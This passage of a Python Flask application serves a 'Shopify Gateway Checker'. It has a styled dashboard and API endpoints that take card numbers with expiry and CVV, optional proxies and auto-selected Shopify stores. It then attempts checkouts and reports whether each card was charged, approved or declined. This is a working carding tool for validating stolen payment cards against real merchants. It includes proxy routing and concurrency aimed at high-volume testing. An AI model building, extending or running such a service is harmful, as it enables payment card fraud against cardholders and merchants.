      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }}
    .card-title {{
      font-size: 1.15rem;
      font-weight: 600;
      margin-bottom: 1rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }}
    .form-group {{
      margin-bottom: 1.25rem;
    }}
    label {{
      display: block;
      font-size: 0.875rem;
      font-weight: 500;
      margin-bottom: 0.4rem;
      color: #e2e8f0;
    }}
    .label-hint {{
      font-weight: 400;
      color: var(--text-muted);
      font-size: 0.8rem;
    }}
    input {{
      width: 100%;
      background: var(--code-bg);
      border: 1px solid var(--border);
      border-radius: 0.6rem;
      padding: 0.75rem 1rem;
      color: var(--text);
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.9rem;
      outline: none;
      transition: all 0.2s;
    }}
    input:focus {{
      border-color: var(--accent);
      box-shadow: 0 0 0 3px var(--accent-glow);
    }}
    .btn {{
      background: var(--accent);
      color: #fff;
      border: none;
      border-radius: 0.6rem;
      padding: 0.75rem 1.5rem;
      font-size: 0.95rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
    }}
    .btn:hover {{
      background: var(--accent-hover);
      box-shadow: 0 0 15px var(--accent-glow);
    }}
    .url-box {{
      background: var(--code-bg);
      border: 1px solid var(--border);
      border-radius: 0.6rem;
      padding: 0.75rem 1rem;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.85rem;
      word-break: break-all;
      color: #93c5fd;
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 0.5rem;
      margin-top: 1rem;
    }}
    .copy-btn {{
      background: rgba(255, 255, 255, 0.1);
      border: none;
      color: var(--text);
      padding: 0.35rem 0.7rem;
      border-radius: 0.4rem;
      font-size: 0.75rem;
      cursor: pointer;
      white-space: nowrap;
      transition: background 0.2s;
    }}
    .copy-btn:hover {{
      background: rgba(255, 255, 255, 0.2);
    }}
    pre.response-box {{
      background: var(--code-bg);
      border: 1px solid var(--border);
      border-radius: 0.6rem;
      padding: 1rem;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.85rem;
      color: #34d399;
      max-height: 250px;
      overflow-y: auto;
      margin-top: 1rem;
      white-space: pre-wrap;
    }}
    table {{
      width: 100%;
      border-collapse: collapse;
      font-size: 0.875rem;
      margin-top: 0.5rem;
    }}
    th, td {{
      padding: 0.65rem 0.75rem;
      text-align: left;
      border-bottom: 1px solid var(--border);
    }}
    th {{
      color: var(--text-muted);
      font-weight: 500;
    }}
    code {{
      font-family: 'JetBrains Mono', monospace;
      background: rgba(255, 255, 255, 0.08);
      padding: 0.2rem 0.4rem;
      border-radius: 0.3rem;
      font-size: 0.825rem;
      color: #c7d2fe;
    }}
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="badge"><span class="badge-dot"></span> Service Live on Railway</div>
      <h1>Shopify Gateway Checker</h1>
      <p class="subtitle">High-throughput checkout verification with auto-domain selection and optional proxy routing.</p>
    </div>

    <div class="card">
      <div class="card-title">🧪 Live API Playground</div>
      
      <div class="form-group">
        <label>Credit Card <span class="label-hint">(Required: NUM|MM|YYYY|CVV)</span></label>
        <input type="text" id="ccInput" placeholder="4532015112830366|05|2027|000" value="4532015112830366|05|2027|000">
      </div>

      <div class="form-group">
        <label>Shopify Store Domain <span class="label-hint">(Optional — auto-generated if blank)</span></label>
        <input type="text" id="siteInput" placeholder="Leave empty for automatic domain selection">
      </div>

      <div class="form-group">
        <label>Proxy <span class="label-hint">(Optional — direct connection if blank)</span></label>
        <input type="text" id="proxyInput" placeholder="ip:port or ip:port:user:pass (Optional)">
      </div>

      <button class="btn" id="runBtn" onclick="testEndpoint()">⚡ Run Check Request</button>

      <div class="url-box">
        <span id="previewUrl">{base_url}/shopify?cc=...</span>
        <button class="copy-btn" onclick="copyUrl()">Copy URL</button>
      </div>

      <pre class="response-box" id="resultBox" style="display: none;"></pre>
    </div>

    <div class="card">
      <div class="card-title">📖 API Reference</div>
      <table>
        <thead>
          <tr>
            <th>Parameter</th>
            <th>Type</th>
            <th>Required</th>
            <th>Description</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>cc</code></td>
            <td>Query / JSON</td>
            <td><strong>Yes</strong></td>
            <td>Format: <code>NUM|MM|YYYY|CVV</code> or <code>NUM|MM|YY|CVV</code></td>
          </tr>
          <tr>
            <td><code>site</code> / <code>domain</code></td>
            <td>Query / JSON</td>
            <td><em>Optional</em></td>
            <td>Shopify store URL. If omitted, automatically selects an active store.</td>
          </tr>
          <tr>
            <td><code>proxy</code></td>
            <td>Query / JSON</td>
            <td><em>Optional</em></td>
            <td>Format: <code>ip:port</code> or <code>user:pass@ip:port</code>. If omitted, direct request.</td>
          </tr>
        </tbody>
      </table>

      <div style="margin-top: 1.25rem; font-size: 0.85rem; color: var(--text-muted);">
        <strong>Endpoints:</strong> <code>GET/POST /shopify</code>, <code>GET/POST /shopii</code>, <code>GET /health</code>
      </div>
    </div>
  </div>

  <script>
    const baseUrl = "{base_url}";

    function updatePreview() {{
      const cc = encodeURIComponent(document.getElementById('ccInput').value.trim() || 'NUM|MM|YYYY|CVV');
      const site = document.getElementById('siteInput').value.trim();
      const proxy = document.getElementById('proxyInput').value.trim();

      let url = `${{baseUrl}}/shopify?cc=${{cc}}`;
      if (site) url += `&site=${{encodeURIComponent(site)}}`;
      if (proxy) url += `&proxy=${{encodeURIComponent(proxy)}}`;

      document.getElementById('previewUrl').innerText = url;
      return url;
    }}

    document.getElementById('ccInput').addEventListener('input', updatePreview);
    document.getElementById('siteInput').addEventListener('input', updatePreview);
    document.getElementById('proxyInput').addEventListener('input', updatePreview);
    updatePreview();

    function copyUrl() {{
      const text = document.getElementById('previewUrl').innerText;
      navigator.clipboard.writeText(text).then(() => alert('API URL copied to clipboard!'));
    }}

    async function testEndpoint() {{
      const btn = document.getElementById('runBtn');
      const resBox = document.getElementById('resultBox');
      const url = updatePreview();

      btn.disabled = true;
      btn.innerText = '⏳ Processing checkout...';
      resBox.style.display = 'block';
      resBox.innerText = 'Executing request to ' + url + '...';

      try {{
        const resp = await fetch(url);
        const data = await resp.json();
        resBox.innerText = JSON.stringify(data, null, 2);
      }} catch (err) {{
        resBox.innerText = 'Error: ' + err.message;
      }} finally {{
        btn.disabled = false;
        btn.innerText = '⚡ Run Check Request';
      }}
    }}
  </script>
</body>
</html>
"""
    return html

@app.route("/health")
def health():
    return jsonify({"status": "ok", "service": "shopify-checker", "auto_domain": True})

@app.route("/shopii", methods=["GET", "POST"])
@app.route("/shopify", methods=["GET", "POST"])
@app.route("/check", methods=["GET", "POST"])
@app.route("/api/check", methods=["GET", "POST"])
def handle_shopii():
    start = time.time()

    # Support JSON body, form data, or query parameters
    if request.is_json:
        data = request.get_json(silent=True) or {}
    else:
        data = request.values or {}

    cc = (data.get("cc") or request.args.get("cc") or request.form.get("cc") or "").strip()
    site = (data.get("site") or data.get("domain") or data.get("shop") or
            request.args.get("site") or request.args.get("domain") or request.args.get("shop") or "").strip()
    proxy_raw = (data.get("proxy") or data.get("proxy_url") or
                 request.args.get("proxy") or request.args.get("proxy_url") or "").strip()

    resp = {"Cc": cc, "Gateway": "Shopify Payments", "Price": "N/A",
            "Currency": "N/A", "Proxy": "Direct", "Response": "Error", "Status": "false"}

    try:
        if not cc:
            resp["Response"] = "ERROR: cc is required (format: NUM|MM|YYYY|CVV)"
            return jsonify(resp), 400

        # Automatic domain generation / fallback if site is omitted
        auto_domain_used = False
        if not site:
            site = get_auto_domain()
            auto_domain_used = True

        if not site.startswith(("http://", "https://")):
            site = "https://" + site
        site = site.rstrip("/")

        resp["Site"] = site
        resp["Domain"] = site
        resp["AutoDomain"] = auto_domain_used

        # Proxy handling: optional in URL
        proxy_url = ""
        proxy_status = "Direct"
        if proxy_raw:
            try:
                proxy_url = normalize_proxy(proxy_raw)
                proxy_status = "Configured"
            except Exception:
                proxy_status = "INVALID PROXY"
        resp["Proxy"] = proxy_status

        if not _checkout_sem.acquire(timeout=60):
            resp["Response"] = "ERROR: server busy — try again"
            return jsonify(resp), 503

        try:
            result, run_err = checkout_with_retry(site, cc, proxy_url, 3)
        finally:
            _checkout_sem.release()

        if result:
            if result.get("gateway"):  resp["Gateway"]  = result["gateway"]
            if result.get("amount"):   resp["Price"]    = result["amount"]
            if result.get("currency"): resp["Currency"] = result["currency"]
            if proxy_raw and proxy_status != "INVALID PROXY":
                resp["Proxy"] = classify_proxy(result, proxy_url)
            elif not proxy_raw:
                resp["Proxy"] = "Direct"

            status = result.get("status", "error")
            if status == "charged":
                resp["Response"] = "Purchase Successful"
                resp["Status"] = "true"
            elif status == "approved":
                resp["Response"] = result.get("status_code") or "3DS_REQUIRED"
            elif status == "declined":
                sc_out = result.get("status_code") or "CARD_DECLINED"
                if sc_out == "CAPTCHA_REQUIRED":
                    sc_out = "CARD_DECLINED"
                resp["Response"] = sc_out
            else:
                resp["Response"] = str(run_err or result.get("status_code") or "Error")
        elif run_err:
            resp["Response"] = str(run_err)
            if proxy_raw and proxy_status != "INVALID PROXY":
                resp["Proxy"] = classify_proxy(None, proxy_url)
            elif not proxy_raw:
                resp["Proxy"] = "Direct"
    except Exception as e:
        log.exception("handle_shopii unhandled error")
        resp["Response"] = f"ERROR: {e}"
        return jsonify(resp), 500

    log.info("[SHOPII] cc=%.16s... site=%s proxy=%s auto_domain=%s resp=%s elapsed=%.2fs",
             cc, site, proxy_status, resp.get("AutoDomain", False), resp["Response"], time.time() - start)
    return jsonify(resp)

@app.errorhandler(Exception)
def handle_exception(err):
    log.exception("unhandled exception")
    return jsonify({"Gateway": "", "Price": "N/A", "Currency": "N/A", "Proxy": "N/A",
                    "Response": f"ERROR: {err}", "Cc": "", "Status": "false"}), 500

# ══════════════════════════════ ENTRY POINT ══════════════════════════════════

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8003))
    public_domain = os.environ.get("RAILWAY_PUBLIC_DOMAIN", "").strip()
    domain_display = f"https://{public_domain}" if public_domain else f"http://0.0.0.0:{port}"

    log.info("=" * 60)
    log.info("Shopify Checker API listening on :%d (waitress, %d threads, %d channels)",
             port, HUENCY_THREADS, HUENCY_CHANNELS)
    log.info("Public Domain:  %s", domain_display)
    log.info("Web Dashboard:  %s/", domain_display)
    log.info("Endpoints:      %s/shopify?cc=NUM|MM|YYYY|CVV", domain_display)
    log.info("                %s/shopii?cc=NUM|MM|YYYY|CVV&proxy=ip:port", domain_display)
    log.info("Health Check:   %s/health", domain_display)
    log.info("=" * 60)

    serve(app, host="0.0.0.0", port=port,
          threads=HUENCY_THREADS,
          connection_limit=HUENCY_CHANNELS,
          channel_timeout=30,
          channel_request_lookahead=0)